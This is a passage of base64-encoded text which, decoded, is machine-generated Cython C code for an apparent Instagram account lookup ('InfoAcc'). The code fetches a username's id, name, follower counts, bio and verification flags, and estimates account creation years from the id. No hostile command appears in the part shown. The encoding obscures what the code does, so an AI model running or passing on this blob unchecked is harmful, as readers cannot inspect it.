9nbG9iYWwtPl9fcHl4X2ludF81Njk5Nzg1MjE3LCBfX3B5eF92X3VpZCwgUHlfTEUpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIxOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGlmIChfX1B5eF9QeU9iamVjdF9Jc1RydWUoX19weXhfdF80KSkgewogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOwogICAgICAgIF9fcHl4X3RfNCA9IFB5T2JqZWN0X1JpY2hDb21wYXJlKF9fcHl4X3ZfdWlkLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfODUwNzk0MDYzNCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIxOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjE4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTgpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxODsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50Xzg1MDc5NDA2MzQsIF9fcHl4X3ZfdWlkLCBQeV9MRSk7IF9fUHl4X1hHT1RSRUYoX19weXhfdF80KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjIwLCBfX3B5eF9MM19lcnJvcikKICAgICAgaWYgKF9fUHl4X1B5T2JqZWN0X0lzVHJ1ZShfX3B5eF90XzQpKSB7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7CiAgICAgICAgX19weXhfdF80ID0gUHlPYmplY3RfUmljaENvbXBhcmUoX19weXhfdl91aWQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCwgUHlfTFQpOyBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIyMCwgX19weXhfTDNfZXJyb3IpCiAgICAgIH0KICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfSXNUcnVlKF9fcHl4X3RfNCk7IGlmICh1bmxpa2VseSgoX19weXhfdF81IDwgMCkpKSBfX1BZWF9FUlIoMCwgMjIwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIGlmIChfX3B5eF90XzUpIHsKCiAgICAgICAgCiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfaW50XzIwMTkpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9pbnRfMjAxOTsKICAgICAgICBnb3RvIF9fcHl4X0w3X3RyeV9yZXR1cm47CgogICAgICAgIAogICAgICB9CgogICAgICAKICAgICAgIHsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3IpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzIwMjBfMjAyMyk7CiAgICAgICAgX19weXhfciA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjAyMF8yMDIzOwogICAgICAgIGdvdG8gX19weXhfTDdfdHJ5X3JldHVybjsKICAgICAgfQoKICAgICAgCiAgICB9CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CgogICAgCiAgICBfX3B5eF90XzYgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICBpZiAoX19weXhfdF82KSB7CiAgICAgIF9fUHl4X0VyclJlc3RvcmUoMCwwLDApOwoKICAgICAgCiAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3cpOwogICAgICBfX3B5eF9yID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X293OwogICAgICBnb3RvIF9fcHl4X0w2X2V4Y2VwdF9yZXR1cm47CiAgICB9CiAgICBnb3RvIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjsKCiAgICAKICAgIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTsKICAgIGdvdG8gX19weXhfTDFfZXJyb3I7CiAgICBfX3B5eF9MN190cnlfcmV0dXJuOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgZ290byBfX3B5eF9MMDsKICAgIF9fcHl4X0w2X2V4Y2VwdF9yZXR1cm46OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wwOwogIH0KCiAgCgogIAogIF9fcHl4X0wxX2Vycm9yOjsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfQWRkVHJhY2ViYWNrKCJuZS5kYXRlIiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgX19weXhfciA9IE5VTEw7CiAgX19weXhfTDA6OwogIF9fUHl4X1hERUNSRUYoX19weXhfdl91aWQpOwogIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3IpOwogIF9fUHl4X1JlZk5hbm55RmluaXNoQ29udGV4dCgpOwogIHJldHVybiBfX3B5eF9yOwp9CgoKCgpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJuZV85SW5mb0FjYyhQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKTsgCnN0YXRpYyBQeU1ldGhvZERlZiBfX3B5eF9tZGVmXzJuZV85SW5mb0FjYyA9IHsiSW5mb0FjYyIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMm5lXzlJbmZvQWNjLCBfX1B5eF9NRVRIX0ZBU1RDQUxMfE1FVEhfS0VZV09SRFMsIDB9OwpzdGF0aWMgUHlPYmplY3QgKl9fcHl4X3B3XzJuZV85SW5mb0FjYyhQeU9iamVjdCAqX19weXhfc2VsZiwgCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTApQeU9iamVjdCAqY29uc3QgKl9fcHl4X2FyZ3MsIFB5X3NzaXplX3QgX19weXhfbmFyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbHNlClB5T2JqZWN0ICpfX3B5eF9hcmdzLCBQeU9iamVjdCAqX19weXhfa3dkcwojZW5kaWYKKSB7CiAgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUgPSAwOwogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZ2cgPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJJbmZvQWNjICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJuYW1lLCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2csMH07CiAgICBjb25zdCBQeV9zc2l6ZV90IF9fcHl4X2t3ZHNfbGVuID0gKF9fcHl4X2t3ZHMpID8gX19QeXhfTnVtS3dhcmdzX0ZBU1RDQUxMKF9fcHl4X2t3ZHMpIDogMDsKICAgIGlmICh1bmxpa2VseShfX3B5eF9rd2RzX2xlbikgPCAwKSBfX1BZWF9FUlIoMCwgMjI4LCBfX3B5eF9MM19lcnJvcikKICAgIGlmIChfX3B5eF9rd2RzX2xlbiA+IDApIHsKICAgICAgc3dpdGNoIChfX3B5eF9uYXJncykgewogICAgICAgIGNhc2UgIDI6CiAgICAgICAgdmFsdWVzWzFdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDEpOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDE6CiAgICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzBdKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIOwogICAgICAgIGNhc2UgIDA6IGJyZWFrOwogICAgICAgIGRlZmF1bHQ6IGdvdG8gX19weXhfTDVfYXJndHVwbGVfZXJyb3I7CiAgICAgIH0KICAgICAgY29uc3QgUHlfc3NpemVfdCBrd2RfcG9zX2FyZ3MgPSBfX3B5eF9uYXJnczsKICAgICAgaWYgKF9fUHl4X1BhcnNlS2V5d29yZHMoX19weXhfa3dkcywgX19weXhfa3d2YWx1ZXMsIF9fcHl4X3B5YXJnbmFtZXMsIDAsIHZhbHVlcywga3dkX3Bvc19hcmdzLCBfX3B5eF9rd2RzX2xlbiwgIkluZm9BY2MiLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpCiAgICAgIGZvciAoUHlfc3NpemVfdCBpID0gX19weXhfbmFyZ3M7IGkgPCAyOyBpKyspIHsKICAgICAgICBpZiAodW5saWtlbHkoIXZhbHVlc1tpXSkpIHsgX19QeXhfUmFpc2VBcmd0dXBsZUludmFsaWQoIkluZm9BY2MiLCAxLCAyLCAyLCBpKTsgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpIH0KICAgICAgfQogICAgfSBlbHNlIGlmICh1bmxpa2VseShfX3B5eF9uYXJncyAhPSAyKSkgewogICAgICBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgfSBlbHNlIHsKICAgICAgdmFsdWVzWzBdID0gX19QeXhfQXJnUmVmX0ZBU1RDQUxMKF9fcHl4X2FyZ3MsIDApOwogICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyMjgsIF9fcHl4X0wzX2Vycm9yKQogICAgICB2YWx1ZXNbMV0gPSBfX1B5eF9BcmdSZWZfRkFTVENBTEwoX19weXhfYXJncywgMSk7CiAgICAgIGlmICghQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiB1bmxpa2VseSghdmFsdWVzWzFdKSkgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpCiAgICB9CiAgICBfX3B5eF92X3VzZXJuYW1lID0gdmFsdWVzWzBdOwogICAgX19weXhfdl9nZyA9IHZhbHVlc1sxXTsKICB9CiAgZ290byBfX3B5eF9MNl9za2lwOwogIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOjsKICBfX1B5eF9SYWlzZUFyZ3R1cGxlSW52YWxpZCgiSW5mb0FjYyIsIDEsIDIsIDIsIF9fcHl4X25hcmdzKTsgX19QWVhfRVJSKDAsIDIyOCwgX19weXhfTDNfZXJyb3IpCiAgX19weXhfTDZfc2tpcDo7CiAgZ290byBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTsKICBfX3B5eF9MM19lcnJvcjo7CiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9BZGRUcmFjZWJhY2soIm5lLkluZm9BY2MiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gTlVMTDsKICBfX3B5eF9MNF9hcmd1bWVudF91bnBhY2tpbmdfZG9uZTo7CiAgX19weXhfciA9IF9fcHl4X3BmXzJuZV84SW5mb0FjYyhfX3B5eF9zZWxmLCBfX3B5eF92X3VzZXJuYW1lLCBfX3B5eF92X2dnKTsKCiAgCiAgZm9yIChQeV9zc2l6ZV90IF9fcHl4X3RlbXA9MDsgX19weXhfdGVtcCA8IChQeV9zc2l6ZV90KShzaXplb2YodmFsdWVzKS9zaXplb2YodmFsdWVzWzBdKSk7ICsrX19weXhfdGVtcCkgewogICAgUHlfWERFQ1JFRih2YWx1ZXNbX19weXhfdGVtcF0pOwogIH0KICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wZl8ybmVfOEluZm9BY2MoQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfc2VsZiwgUHlPYmplY3QgKl9fcHl4X3ZfdXNlcm5hbWUsIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfZ2cpIHsKICBQeU9iamVjdCAqX19weXhfdl9yciA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfSWQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2Z1bGxfbmFtZSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZm93cyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZm93ZyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfcHAgPSBOVUxMOwogIENZVEhPTl9VTlVTRUQgUHlPYmplY3QgKl9fcHl4X3ZfaXNQcmFpc2UgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF92X2JpbyA9IE5VTEw7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9pc192ZXJpZmllZCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfYml6eiA9IE5VTEw7CiAgaW50IF9fcHl4X3ZfbWV0YTsKICBQeU9iamVjdCAqX19weXhfdl9zcyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3ZfZmlsZSA9IE5VTEw7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9lID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfciA9IE5VTEw7CiAgX19QeXhfUmVmTmFubnlEZWNsYXJhdGlvbnMKICBQeU9iamVjdCAqX19weXhfdF8xID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF80ID0gTlVMTDsKICBzaXplX3QgX19weXhfdF81OwogIFB5T2JqZWN0ICpfX3B5eF90XzYgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzggPSBOVUxMOwogIGludCBfX3B5eF90Xzk7CiAgaW50IF9fcHl4X3RfMTA7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzEyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTQgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE1ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xNiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMTcgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzE4ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8xOSA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjBbMjddOwogIFB5T2JqZWN0ICpfX3B5eF90XzIxID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yMiA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMjMgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzI0ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8yNVs2XTsKICBpbnQgX19weXhfdF8yNjsKICBpbnQgX19weXhfdF8yNzsKICBjaGFyIGNvbnN0ICpfX3B5eF90XzI4OwogIFB5T2JqZWN0ICpfX3B5eF90XzI5ID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zMCA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMzEgPSBOVUxMOwogIFB5T2JqZWN0ICpfX3B5eF90XzMyID0gTlVMTDsKICBQeU9iamVjdCAqX19weXhfdF8zMyA9IE5VTEw7CiAgUHlPYmplY3QgKl9fcHl4X3RfMzQgPSBOVUxMOwogIGludCBfX3B5eF9saW5lbm8gPSAwOwogIGNvbnN0IGNoYXIgKl9fcHl4X2ZpbGVuYW1lID0gTlVMTDsKICBpbnQgX19weXhfY2xpbmVubyA9IDA7CiAgX19QeXhfUmVmTmFubnlTZXR1cENvbnRleHQoIkluZm9BY2MiLCAwKTsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2luZm9pbnN0YSk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIzMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMzEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjMxLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzUgPSAxOwogICNpZiBDWVRIT05fVU5QQUNLX01FVEhPRFMKICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF80KSkpIHsKICAgIF9fcHl4X3RfMiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfNCk7CiAgICBhc3NlcnQoX19weXhfdF8yKTsKICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF80KTsKICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzIpOwogICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNCwgX19weXhfX2Z1bmN0aW9uKTsKICAgIF9fcHl4X3RfNSA9IDA7CiAgfQogICNlbmRpZgogIHsKICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzIsIF9fcHl4X3ZfdXNlcm5hbWUsIF9fcHl4X3RfM307CiAgICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfNSwgKDMtX19weXhfdF81KSB8IChfX3B5eF90XzUqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjMxLCBfX3B5eF9MMV9lcnJvcikKICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIH0KICBfX3B5eF92X3JyID0gX19weXhfdF8xOwogIF9fcHl4X3RfMSA9IDA7CgogIAogIF9fcHl4X3RfMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xKSkgX19QWVhfRVJSKDAsIDIzMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMSk7CiAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzZdLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjMzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8xKTsgX19weXhfdF8xID0gMDsKICBfX3B5eF92X0lkID0gX19weXhfdF80OwogIF9fcHl4X3RfNCA9IDA7CgogIAogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzddLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjM0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICBfX3B5eF92X2Z1bGxfbmFtZSA9IF9fcHl4X3RfMTsKICBfX3B5eF90XzEgPSAwOwoKICAKICBfX3B5eF90XzEgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3ZfcnIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMSkpIF9fUFlYX0VSUigwLCAyMzUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzEpOwogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF8xLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs4XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMSk7IF9fcHl4X3RfMSA9IDA7CiAgX19weXhfdl9mb3dzID0gX19weXhfdF80OwogIF9fcHl4X3RfNCA9IDA7CgogIAogIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yciwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldCk7IGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDIzNiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgX19weXhfdF8xID0gX19QeXhfUHlPYmplY3RfQ2FsbChfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X3R1cGxlWzldLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEpKSBfX1BZWF9FUlIoMCwgMjM2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8xKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICBfX3B5eF92X2Zvd2cgPSBfX3B5eF90X